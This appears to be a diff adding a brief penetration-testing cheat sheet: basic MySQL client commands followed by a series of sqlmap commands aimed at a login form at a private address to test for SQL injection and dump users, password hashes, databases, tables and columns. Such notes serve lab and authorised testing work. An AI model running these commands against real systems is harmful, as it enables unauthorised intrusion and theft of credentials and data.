@@ -1,0 +1,29 @@
+SQL Basics
+Connecting
+mysql -u [user] -p -h [host/IP]
+SHOW DATABASES
+USE [database name]
+SELECT * FROM [table]
+INSERT INTO [table] (column_1, column_2...) VALUES (column_1_value, column_2_value)
+example
+INSERT INTO users (name, password) VALUES (ben, password)
+
+Passing commands via sqlmap to POST fields on webapps
+
+Simple
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms --banner
+
+Try to dump databases if vulnerable to sql injection
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms --users --passwords
+
+To look for databases that user has access to
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms --dbs
+
+Now you can enumerate tables in a specific database 
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms -D [database] --tables
+
+Enumerate the tables
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms -D [database] -T [table] --columns
+
+Get the specific columns
+sqlmap -u http://10.1.1.1/login/ --dbms=mysql --forms -D [database] -T [table] -C [column1,column2...] --dump
